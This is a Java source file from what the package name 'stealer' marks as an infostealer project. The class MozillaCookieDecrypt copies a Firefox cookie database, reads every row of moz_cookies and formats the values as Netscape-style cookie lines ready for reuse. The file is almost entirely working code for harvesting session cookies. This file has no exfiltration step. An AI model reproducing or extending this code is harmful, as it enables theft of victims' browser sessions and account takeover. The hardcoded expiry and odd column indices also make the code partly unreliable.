package dev.kazi.stealer.utils.decrypt.cookie;

import java.sql.SQLException;
import java.sql.ResultSet;
import java.sql.Statement;
import java.sql.Connection;
import java.sql.DriverManager;
import java.nio.file.Files;
import java.nio.file.CopyOption;
import java.util.UUID;
import java.util.HashSet;
import java.util.ArrayList;
import java.util.List;
import java.io.File;

public class MozillaCookieDecrypt {

    private File COOKIE_PATH;
    public List<String> COOKIE_DATA;
    public List<String> COOKIES;
    
    public MozillaCookieDecrypt(final String path0) {
        this.COOKIE_PATH = null;
        this.COOKIE_PATH = new File(path0);
        this.COOKIES = new ArrayList<String>();
        this.COOKIE_DATA = new ArrayList<String>();
    }
    
    public String getData() {
        final StringBuilder temp = new StringBuilder();
        this.COOKIES.forEach(cookie -> temp.append(cookie).append("\n"));
        return temp.toString();
    }
    
    public MozillaCookieDecrypt getCookies() {
        final HashSet<Cookie> cookies = new HashSet<Cookie>();
        Connection connection = null;
        File tempFile = null;
        try {
            tempFile = new File(UUID.randomUUID().toString());
            Files.copy(this.COOKIE_PATH.toPath(), tempFile.toPath(), new CopyOption[0]);
            Class.forName("org.sqlite.JDBC");
            connection = DriverManager.getConnection("jdbc:sqlite:" + tempFile.getAbsolutePath());
            final Statement statement = connection.createStatement();
            statement.setQueryTimeout(30);
            final ResultSet resultSet = statement.executeQuery("SELECT * FROM moz_cookies");
            while (resultSet.next()) {
                final String name = resultSet.getString("name");
                this.parseCookieFromResult(tempFile, name, cookies, resultSet);
            }
        }
        catch (final Exception exception) {
            try {
                if (connection != null) {
                    connection.close();
                }
            }
            catch (final Exception exception2) {
                throw new RuntimeException(exception2);
            }
        }
        if (tempFile != null) {
            tempFile.delete();
        }
        return this;
    }
    
    private void parseCookieFromResult(final File cookieStore, final String name, final HashSet<Cookie> cookieSet, final ResultSet resultSet) throws SQLException {
        final String url = resultSet.getString(5);
        final String secure = resultSet.getString(3);
        final String secretKey = resultSet.getString(4);
        final Boolean bool1 = resultSet.getBoolean(1);
        final Boolean bool2 = resultSet.getBoolean(2);
        final String path = "/";
        final String expires = "1679385983";
        if (secretKey != null) {
            final String format = url + "\t" + String.valueOf(bool1).toUpperCase() + "\t" + path + "\t" + String.valueOf(bool2).toUpperCase() + "\t" + expires + "\t" + secure + "\t" + secretKey;
            this.COOKIES.add(format);
        }
    }
}
